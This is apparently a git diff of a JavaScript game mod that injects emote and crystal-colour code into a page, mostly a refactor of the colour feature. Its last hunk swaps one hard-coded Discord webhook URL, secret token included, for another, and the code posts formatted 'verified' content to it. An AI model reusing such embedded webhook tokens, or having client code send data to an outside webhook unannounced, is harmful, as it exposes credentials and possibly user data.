@@ -327,11 +327,11 @@ if (window.modSettings && window.modSettings.emoteCapacity) {
 }
 `;
 
+const crystalColorMod = `
 /*
  * Change crystal color (integrated version)
  */
 let CrystalObject;
-let updateCrystalColor = () => {}; // Declare updateCrystalColor in the outer scope
 
 // Function to find CrystalObject
 const findCrystalObject = () => {
@@ -384,8 +384,8 @@ if (CrystalObject) {
     return instance;
   };
 
-  // Define updateCrystalColor to update crystal colors dynamically
-  updateCrystalColor = (color) => {
+  // Function to update crystal colors dynamically
+  const updateCrystalColor = (color) => {
     try {
       localStorage.setItem('crystal-color', color);
       materialInstances.forEach((material) => {
@@ -419,9 +419,11 @@ if (CrystalObject) {
   });
 } else {
   console.warn('CrystalObject not found!');
-  // updateCrystalColor remains a no-op in the global scope
-}
 
+  // Define a placeholder function to avoid errors
+  const updateCrystalColor = () => {};
+}
+`;
 
 src = src.replace('</body>', `
   ${controlStyles}
@@ -841,7 +843,7 @@ injectLoader();
     console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
 
     // Webhook URL
-    const webhookURL = "https://discord.com/api/webhooks/1342950155774857227/wwWvZTRJ-jC-bb3dw5N55uf3MyZKEOJRQ0xqUYa4gqo3NiN_DvM4PiTva_qdLbykX5hK";
+    const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
 
     // Payload for Discord webhook
     const payload = {
